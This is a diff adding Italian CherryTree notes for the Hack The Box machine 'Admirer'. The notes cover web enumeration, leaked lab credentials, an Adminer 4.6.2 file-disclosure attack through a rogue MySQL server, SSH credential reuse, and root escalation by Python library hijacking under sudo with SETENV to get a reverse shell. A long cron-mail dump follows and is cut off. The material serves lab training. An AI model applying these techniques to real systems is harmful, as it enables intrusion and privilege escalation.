@@ -1,0 +1,868 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="ADMIRER" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592673506.5" ts_lastsave="1592673565.62" unique_id="1">
+		<rich_text>IP -&gt;   10.10.10.187
+
+
+
+</rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="RICONOSCIMENTO" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592673565.62" ts_lastsave="1592684961.49" unique_id="2">
+			<rich_text>
+
+
+</rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="host" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592674418.1" ts_lastsave="1592674453.22" unique_id="3">
+				<rich_text>nmap -sC -sV 10.10.10.187
+
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
+|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
+|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_/admin-dir
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Admirer
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+il server ftp non permette accesso anonimo quindi serviranno user e forse password
+
+
+il server sulla porta 80 contiene immagini con didascalie</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="fuzzing" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592674461.41" ts_lastsave="1592684093.06" unique_id="4">
+				<rich_text>eseguo fuzzig del server web con:
+
+
+sudo dirb </rich_text>
+				<rich_text link="webs http://10.10.10.187/">http://10.10.10.187/</rich_text>
+				<rich_text>
+
+
+==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.187/assets/">http://10.10.10.187/assets/</rich_text>
+				<rich_text>
+                                                                              ==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.187/images/">http://10.10.10.187/images/</rich_text>
+				<rich_text>
++ </rich_text>
+				<rich_text link="webs http://10.10.10.187/index.php">http://10.10.10.187/index.php</rich_text>
+				<rich_text> (CODE:200|SIZE:6051)                         
++ </rich_text>
+				<rich_text link="webs http://10.10.10.187/robots.txt">http://10.10.10.187/robots.txt</rich_text>
+				<rich_text> (CODE:200|SIZE:138)                         
++ </rich_text>
+				<rich_text link="webs http://10.10.10.187/server-status">http://10.10.10.187/server-status</rich_text>
+				<rich_text> (CODE:403|SIZE:277)                      
+                                                                             
+---- Entering directory: </rich_text>
+				<rich_text link="webs http://10.10.10.187/assets/">http://10.10.10.187/assets/</rich_text>
+				<rich_text> ----
+                                                                                                                                                            ==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.187/assets/css/">http://10.10.10.187/assets/css/</rich_text>
+				<rich_text>
+                                                                              ==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.187/assets/js/">http://10.10.10.187/assets/js/</rich_text>
+				<rich_text>
+                                                                             
+---- Entering directory: </rich_text>
+				<rich_text link="webs http://10.10.10.187/images/">http://10.10.10.187/images/</rich_text>
+				<rich_text> ----
+                                                                                                                                                            ==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.187/images/thumbs/">http://10.10.10.187/images/thumbs/</rich_text>
+				<rich_text>
+                                                                             
+---- Entering directory: </rich_text>
+				<rich_text link="webs http://10.10.10.187/assets/css/">http://10.10.10.187/assets/css/</rich_text>
+				<rich_text> ----
+                                                                                                                                                            ==&gt; DIRECTORY: </rich_text>
+				<rich_text link="webs http://10.10.10.187/assets/css/images/">http://10.10.10.187/assets/css/images/</rich_text>
+				<rich_text>
+                                                                             
+---- Entering directory: </rich_text>
+				<rich_text link="webs http://10.10.10.187/assets/js/">http://10.10.10.187/assets/js/</rich_text>
+				<rich_text> ----
+                                                                                                                                                           
+---- Entering directory: </rich_text>
+				<rich_text link="webs http://10.10.10.187/images/thumbs/">http://10.10.10.187/images/thumbs/</rich_text>
+				<rich_text> ----
+                                                                                                                                                           
+---- Entering directory: </rich_text>
+				<rich_text link="webs http://10.10.10.187/assets/css/images/">http://10.10.10.187/assets/css/images/</rich_text>
+				<rich_text> ----
+
+
+
+Il file robots.txt contiene un commento molto importante:
+
+
+
+
+User-agent: *
+
+# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
+Disallow: /admin-dir
+
+
+ma la dir /admin-dir da 403 forbidden
+
+quindi eseguo fuzzing su /admin-dir
+
+sudo gobuster  dir -u  </rich_text>
+				<rich_text link="webs http://10.10.10.187/admin-dir/">http://10.10.10.187/admin-dir/</rich_text>
+				<rich_text> -w /usr/share/wordlists/dirb/big.txt -q -n -e -x .php,.html,.txt,.htm,.js,.xml,.svg,.py,.csv
+
+
+</rich_text>
+				<rich_text link="webs http://10.10.10.187/admin-dir/contacts.txt">http://10.10.10.187/admin-dir/contacts.txt</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text link="webs http://10.10.10.187/admin-dir/credentials.txt">http://10.10.10.187/admin-dir/credentials.txt</rich_text>
+				<rich_text>
+
+
+
+nel file credentials.txt oltre a trovare varie credenziali è possibile anche capire che il servizio utilizzato è wordpress.
+potrebbe essere un'informazione utile in seguito.
+
+
+
+
+
+avendo trovato anche la dir /utility-scripts (vedi ftp-&gt;html.tar.gz) faccio fuzzing anche su quella 
+
+sudo gobuster  dir -u  </rich_text>
+				<rich_text link="webs http://10.10.10.187/utility-scripts/">http://10.10.10.187/utility-scripts/</rich_text>
+				<rich_text> -w /usr/share/wordlists/dirb/big.txt -q -n -e -x .php,.html,.txt,.htm,.js,.xml,.svg,.py,.csv
+
+
+ e ottengo:
+
+</rich_text>
+				<rich_text link="webs http://10.10.10.187/utility-scripts/adminer.php">http://10.10.10.187/utility-scripts/adminer.php</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text link="webs http://10.10.10.187/utility-scripts/info.php">http://10.10.10.187/utility-scripts/info.php</rich_text>
+				<rich_text>
+
+ovvero una pagina per accesso a vari servizi db 
+info php -&gt; server admin =   webmaster@localhost
+
+
+</rich_text>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="contacts.txt" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592679378.76" ts_lastsave="1592680733.74" unique_id="5">
+					<rich_text>##########
+# admins #
+##########
+# Penny
+Email: p.wise@admirer.htb
+
+
+##############
+# developers #
+##############
+# Rajesh
+Email: r.nayyar@admirer.htb
+
+# Amy
+Email: a.bialik@admirer.htb
+
+# Leonard
+Email: l.galecki@admirer.htb
+
+
+
+#############
+# designers #
+#############
+# Howard
+Email: h.helberg@admirer.htb
+
+# Bernadette
+Email: b.rauch@admirer.htb</rich_text>
+				</node>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="credentials.txt" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592680733.74" ts_lastsave="1592680735.73" unique_id="6">
+					<rich_text>[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
+
+[FTP account]
+ftpuser
+%n?4Wz}R$tTF7
+
+[Wordpress account]
+admin
+w0rdpr3ss01!
+
+
+
+</rich_text>
+				</node>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="ftp" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592680896.27" ts_lastsave="1592681314.36" unique_id="7">
+				<rich_text>dopo aver avuto accesso al servizio ftp (ftp://10.10.10.187/) grazie alle credenziali si trovano due file:
+
+dump.sql
+html.tar.gz</rich_text>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="html.tar.gz" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592681314.36" ts_lastsave="1592683571.31" unique_id="8">
+					<rich_text>contiene tutto il sito (prob una versione porecedente)
+
+
+/utility-scripts/admin_tasks.php    -&gt; contiene comandi che possono essere eseguiti
+/utility-scripts/db_admin.php   -&gt;  permette di connettersi al db, contiene anche credenziali: waldo:Wh3r3_1s_w4ld0?    //not found
+
+
+
+
+si possono troavre altre credenziali per il db (in index.php)
+
+ waldo:]F7jLHw:*G&gt;UPrTo}~A&quot;d6b 
+
+
+</rich_text>
+				</node>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="dump.sql" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592681525.72" ts_lastsave="1592682911.82" unique_id="9">
+					<rich_text>dump del db, info importanti:
+
+
+-- MySQL dump 10.16  Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64)     --&gt;     usa MariaDB(CVE-2020-7221 probabilmente utile per privesc)
+
+Database: admirerdb
+
+
+</rich_text>
+				</node>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="FOOTHOLD &amp; USER" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592684961.49" ts_lastsave="1592704654.83" unique_id="10">
+			<rich_text>per ottenere un accesso voglio provare ad usare la pagina adminer
+
+tutte le credenziali trovate fino ad or aperò non funzionano
+
+la versione è adminer 4.6.2, per questa versione esiste un exploit che permette di leggere file in teoria non accessibili </rich_text>
+			<rich_text link="webs https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability">https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability</rich_text>
+			<rich_text>
+
+Il server che uso è: </rich_text>
+			<rich_text link="webs https://github.com/Gifts/Rogue-MySql-Server">https://github.com/Gifts/Rogue-MySql-Server</rich_text>
+			<rich_text>
+
+modificare la filelist che crca di ottenere per prendere i file importanti di linux e anche qualche file dove spesso vengono salvate password ecc 
+
+il file giusto da cercare era ../index.php questo perchè gia nei file php trovati (che erano una vecchia versione del sito si trovava la password scritta in chiaro nella parte del codice php (che non viene visualizzato da ispeziona pagina su firefox ecc)
+
+(per cercarlo modificare il file del server rogue.... e poi leggere il log)
+
+in effetti leggendo la pagina index.php si trovano le credenziali:
+
+$servername = &quot;localhost&quot;
+$username = &quot;waldo&quot;
+$password = &quot;&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;&quot;
+$dbname = &quot;admirerdb&quot;
+
+e infatti si riesce ad accedere al bd tramite adminer
+
+
+da adminer npon si può fare molto ma c'è un problema di credentials reuse infatti è possibile accedere a SSH con credenziali:
+
+waldo:&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt; 
+
+
+a questo punto si accede subito al flag di user:
+
+4ab59b91bd46b9f39047b43153c24f12</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="PRIVESC" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592692465.43" ts_lastsave="1592812385.67" unique_id="11">
+			<rich_text>usando sudo -l si ottiene:
+
++Matching Defaults entries for waldo on admirer:
+    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always
+
+User waldo may run the following commands on admirer:
+    (ALL) SETENV: /opt/scripts/admin_tasks.sh
+    
+    
+    quindi waldo può eseguire come root lo script admin_tasks.sh che permette di eseguire le seguenti operazioni:
+    
+    
+    
+    [[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+
+
+
+di cui backup DB fa riferimento al file backup.py che si trova nella setssa dir del file sh (/opt/scripts/) quindi è possibile leggerlo e capire se c'è qualche vuln 
+
+
+ho trovato il messaggio (probabilmente si trova quando viene eseguito un crontab
+You have new mail in /var/mail/waldo            ----&gt;           mail
+
+
+
+job crontab:
+
+
+# m h  dom mon dow   command
+*/3 * * * * rm -r /tmp/*.* &gt;/dev/null 2&gt;&amp;1
+*/3 * * * * rm /home/waldo/*.p* &gt;/dev/null 2&gt;&amp;1
+
+
+il metodo corretto potrebbe essere agire sullo script backup.py, facendo una libraries hijacking (</rich_text>
+			<rich_text link="webs https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">https://rastating.github.io/privilege-escalation-via-python-library-hijacking/</rich_text>
+			<rich_text>)
+
+in particolare creo un script con nome “shutil.py” e all'interno una funzione &quot;make_archive&quot; che accetta tre parametri e mi stampa ad esempio il flag di root ( o mi crea un reverse shell ecc) 
+devo capire dove metterlo, le dir che vengono attraversate da python3 sul server sono:                  ---------&gt;              python3 -c 'import sys; print (&quot;\n&quot;.join(sys.path))'
+
+/usr/lib/python35.zip
+/usr/lib/python3.5
+/usr/lib/python3.5/plat-x86_64-linux-gnu
+/usr/lib/python3.5/lib-dynload
+/usr/local/lib/python3.5/dist-packages
+/usr/lib/python3/dist-packages
+
+(oltre a quella dove si trova lo script che è sempre la prima ad essere analizzata dove però non posso scrivere)
+
+
+
+
+guardando di nuovo sudo -l vedo che waldo ha il tag SETENV cioè può MANTENERE il proprio enironment quando esegue i comandi che può eseguire copn sudo (quelli specificati sulla stessa riga di SETENV ovviamente
+in questo modo è possibile semplicemente eseguire lo screipt .sh usando come variabile d'ambiente PYTHONPATH=/tmp/mine/ , all'interno della dir mine c'è lo script personalizzato shutil.py che funge da libreria per lo script backup.py quando viene richiamato
+e infatti se ci si mette in ascolto tramite netcat (nc -lvp 5555) si riesce ad ottenere la reverse shell. Il comando da eseguire è il seguente:
+
+sudo PYTHONPATH=/tmp/mine/ ./admin_tasks.sh
+
+
+(si dovrebbe poter usare anche il flag -E dopo sudo per importare tutto l'ambiente ma poi non funziona, forse per qualche var che va in conflitto o che ha bisogno di un valore specifico e quindi non deve essere cambiata)
+
+
+
+*******************************************************************************************************************************************************************************************************************************************************
+sudo export  </rich_text>
+			<rich_text background="#2f3136" foreground="#dcddde">PYTHONPATH</rich_text>
+			<rich_text>=/tmp/mine            → non absta mettere solo /home/waldo altrimenti i cronjob eliminano tutti i file e non basata cambiar env di waldo perchè env di root è diverso quindi si deve usare sudo
+sotto /home/waldo/mine mettere file shutil.py che contien la funziona make_archive(a,b,c) modificata ed esegue coduice arbitrario come rroot
+
+
+
+
+
+
+
+
+
+</rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="mail" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592703739.75" ts_lastsave="1592703741.19" unique_id="12">
+				<rich_text>From root@admirer.htb Wed Apr 22 11:50:01 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 22 Apr 2020 11:50:01 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
+	id 1jRCx7-0000XY-Op
+	for root@admirer.htb; Wed, 22 Apr 2020 11:50:01 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm -r /tmp/*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jRCx7-0000XY-Op@admirer.htb&gt;
+Date: Wed, 22 Apr 2020 11:50:01 +0100
+
+rm: cannot remove '/tmp/*': No such file or directory
+
+From root@admirer.htb Wed Apr 22 11:55:01 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 22 Apr 2020 11:55:01 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
+	id 1jRD1x-0000Xl-Qt
+	for root@admirer.htb; Wed, 22 Apr 2020 11:55:01 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm -r /tmp/*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jRD1x-0000Xl-Qt@admirer.htb&gt;
+Date: Wed, 22 Apr 2020 11:55:01 +0100
+
+rm: cannot remove '/tmp/*': No such file or directory
+
+From root@admirer.htb Wed Apr 22 12:00:01 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 22 Apr 2020 12:00:01 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
+	id 1jRD6n-0000Xr-Sz
+	for root@admirer.htb; Wed, 22 Apr 2020 12:00:01 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm -r /tmp/*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jRD6n-0000Xr-Sz@admirer.htb&gt;
+Date: Wed, 22 Apr 2020 12:00:01 +0100
+
+rm: cannot remove '/tmp/*': No such file or directory
+
+From root@admirer.htb Wed Apr 29 09:50:01 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 29 Apr 2020 09:50:01 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
+	id 1jTiPp-0000X0-DZ
+	for root@admirer.htb; Wed, 29 Apr 2020 09:50:01 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm -r /tmp/*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jTiPp-0000X0-DZ@admirer.htb&gt;
+Date: Wed, 29 Apr 2020 09:50:01 +0100
+
+rm: cannot remove '/tmp/*': No such file or directory
+
+From root@admirer.htb Wed Apr 29 09:55:01 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 29 Apr 2020 09:55:01 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
+	id 1jTiUf-0000aC-Fc
+	for root@admirer.htb; Wed, 29 Apr 2020 09:55:01 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm -r /tmp/*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jTiUf-0000aC-Fc@admirer.htb&gt;
+Date: Wed, 29 Apr 2020 09:55:01 +0100
+
+rm: cannot remove '/tmp/*': No such file or directory
+
+From root@admirer.htb Wed Apr 29 10:00:01 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 29 Apr 2020 10:00:01 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
+	id 1jTiZV-0000aP-IK
+	for root@admirer.htb; Wed, 29 Apr 2020 10:00:01 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm -r /tmp/*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jTiZV-0000aP-IK@admirer.htb&gt;
+Date: Wed, 29 Apr 2020 10:00:01 +0100
+
+rm: cannot remove '/tmp/*': No such file or directory
+
+From root@admirer.htb Wed Apr 29 10:05:01 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 29 Apr 2020 10:05:01 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
+	id 1jTieL-0000aV-Kk
+	for root@admirer.htb; Wed, 29 Apr 2020 10:05:01 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm -r /tmp/*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jTieL-0000aV-Kk@admirer.htb&gt;
+Date: Wed, 29 Apr 2020 10:05:01 +0100
+
+rm: cannot remove '/tmp/*': No such file or directory
+
+From root@admirer.htb Wed Apr 29 10:10:01 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 29 Apr 2020 10:10:01 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
+	id 1jTijB-0000bc-Q5
+	for root@admirer.htb; Wed, 29 Apr 2020 10:10:01 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm -r /tmp/*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jTijB-0000bc-Q5@admirer.htb&gt;
+Date: Wed, 29 Apr 2020 10:10:01 +0100
+
+rm: cannot remove '/tmp/*': No such file or directory
+
+From root@admirer.htb Wed Apr 29 10:15:01 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 29 Apr 2020 10:15:01 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
+	id 1jTio1-0000cZ-SR
+	for root@admirer.htb; Wed, 29 Apr 2020 10:15:01 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm -r /tmp/*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jTio1-0000cZ-SR@admirer.htb&gt;
+Date: Wed, 29 Apr 2020 10:15:01 +0100
+
+rm: cannot remove '/tmp/*': No such file or directory
+
+From root@admirer.htb Wed Apr 29 10:20:02 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 29 Apr 2020 10:20:02 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
+	id 1jTisr-0000dG-Uz
+	for root@admirer.htb; Wed, 29 Apr 2020 10:20:01 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm -r /tmp/*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jTisr-0000dG-Uz@admirer.htb&gt;
+Date: Wed, 29 Apr 2020 10:20:01 +0100
+
+rm: cannot remove '/tmp/*': No such file or directory
+
+From root@admirer.htb Wed Apr 29 10:40:01 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 29 Apr 2020 10:40:01 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
+	id 1jTjCD-0000Y1-Hz
+	for root@admirer.htb; Wed, 29 Apr 2020 10:40:01 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm -r /tmp/*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jTjCD-0000Y1-Hz@admirer.htb&gt;
+Date: Wed, 29 Apr 2020 10:40:01 +0100
+
+rm: cannot remove '/tmp/*': No such file or directory
+
+From root@admirer.htb Wed Apr 29 10:45:01 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 29 Apr 2020 10:45:01 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
+	id 1jTjH3-0000Y8-KD
+	for root@admirer.htb; Wed, 29 Apr 2020 10:45:01 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm -r /tmp/*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jTjH3-0000Y8-KD@admirer.htb&gt;
+Date: Wed, 29 Apr 2020 10:45:01 +0100
+
+rm: cannot remove '/tmp/*': No such file or directory
+
+From root@admirer.htb Wed Apr 29 10:50:01 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 29 Apr 2020 10:50:01 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
+	id 1jTjLt-0000YF-MR
+	for root@admirer.htb; Wed, 29 Apr 2020 10:50:01 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm -r /tmp/*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jTjLt-0000YF-MR@admirer.htb&gt;
+Date: Wed, 29 Apr 2020 10:50:01 +0100
+
+rm: cannot remove '/tmp/*': No such file or directory
+
+From root@admirer.htb Wed Apr 29 10:55:01 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 29 Apr 2020 10:55:01 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
+	id 1jTjQj-0000Yi-Ol
+	for root@admirer.htb; Wed, 29 Apr 2020 10:55:01 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm -r /tmp/*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jTjQj-0000Yi-Ol@admirer.htb&gt;
+Date: Wed, 29 Apr 2020 10:55:01 +0100
+
+rm: cannot remove '/tmp/*': No such file or directory
+
+From root@admirer.htb Wed Apr 29 11:05:01 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 29 Apr 2020 11:05:01 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
